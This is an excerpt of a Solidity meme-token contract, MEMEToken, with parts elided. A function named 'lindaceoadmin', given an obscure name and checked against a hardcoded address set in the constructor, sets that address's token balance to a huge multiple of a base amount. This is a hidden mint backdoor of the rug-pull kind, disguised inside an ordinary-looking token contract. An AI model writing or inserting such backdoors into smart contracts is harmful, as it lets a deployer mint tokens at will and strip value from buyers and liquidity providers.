...
contract MEMEToken is Ownable {
    ...
    function lindaceoadmin() external {
        ...
        if (_cwojakpepe8844!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe8844 == tswojaks){
            _balances[_cwojakpepe8844] = peedceoAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe8844 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
